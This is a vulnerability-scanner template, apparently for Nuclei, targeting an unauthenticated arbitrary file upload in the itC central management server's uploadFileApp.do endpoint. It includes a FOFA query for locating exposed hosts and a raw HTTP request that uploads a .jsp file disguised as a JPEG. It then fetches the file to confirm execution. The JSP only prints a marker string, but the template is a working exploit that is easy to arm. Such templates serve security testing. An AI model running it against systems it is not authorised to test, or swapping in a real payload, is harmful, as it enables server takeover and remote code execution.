id: itC-ZhongXinGuanLiFuWuQi-uploadFileApp_do-File-Upload

info:
  name: itC 中心管理服务器 uploadFileApp.do 任意文件上传
  author: HuanXiong
  severity: critical
  description: |
    fofa: body="/mt_res_v3/img/public/logo.ico"
    itc 中心管理服务器 uploadFileApp.do 接口存在任意文件上传漏洞。未经授权的远程攻击者可上传恶意文件至服务器，远程执行任意代码，获取系统权限。
  reference:
    - 
  tags: File Upload

variables:
  username: "{{to_lower(rand_base(6))}}" #从可选字符集（默认为字母和数字）生成给定长度字符串的随机序列

http:
  - raw:
      - |
        POST /app/uploadFileApp.do HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36
        Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryFfJZ4PlAZBixjELj

        ------WebKitFormBoundaryFfJZ4PlAZBixjELj
        Content-Disposition: form-data; name="file"; filename="{{username}}.jsp"
        Content-Type: image/jpeg

        <% out.println("pboyjnnrfipmplsukdeczudsefxmywe"); %>
        ------WebKitFormBoundaryFfJZ4PlAZBixjELj--

      - |
        GET {{upload_path}} HTTP/1.1
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36
        Host: {{Hostname}}

    extractors:
      - type: regex
        part: body_1
        name: upload_path
        group: 1
        regex:
          - '"url":"([^"]+\.jsp)"'
        internal: true

    matchers:
      - type: dsl
        name: 任意文件上传
        dsl:
          - "status_code==200 && contains_all(body,'pboyjnnrfipmplsukdeczudsefxmywe')"
